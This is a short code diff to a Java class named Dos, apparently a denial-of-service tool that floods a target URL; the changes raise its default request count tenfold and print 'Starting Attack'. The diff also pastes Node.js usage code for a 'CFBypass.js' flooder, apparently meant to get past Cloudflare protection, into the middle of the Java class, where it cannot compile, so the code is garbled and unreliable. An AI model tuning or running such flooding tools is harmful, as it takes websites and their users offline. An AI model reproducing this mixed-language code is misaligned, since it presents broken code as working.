@@ -44,8 +44,14 @@ public class Dos implements Runnable {
         } catch (Exception e) {
 
         }
-    }
+    
+}
 
+if (process.argv.length <= 2) {
+    console.log("Usage: node CFBypass.js <url> <time>");
+    console.log("Usage: node CFBypass.js <http://example.com> <60>");
+    process.exit(-1);
+}
 
     public static void main(String[] args) throws Exception {
         String url = "";
@@ -72,7 +78,7 @@ public class Dos implements Runnable {
         String amount = in.nextLine();
 
         if (amount == null || amount.equals(null) || amount.equals("")) {
-            Dos.amount = 2000;
+            Dos.amount = 20000;
         } else {
             Dos.amount = Integer.parseInt(amount);
         }
@@ -94,7 +100,7 @@ public class Dos implements Runnable {
             }
         }
 
-        Thread.sleep(2000);
+        Thread.sleep(20000);
 
 
         System.out.println("Starting Attack");
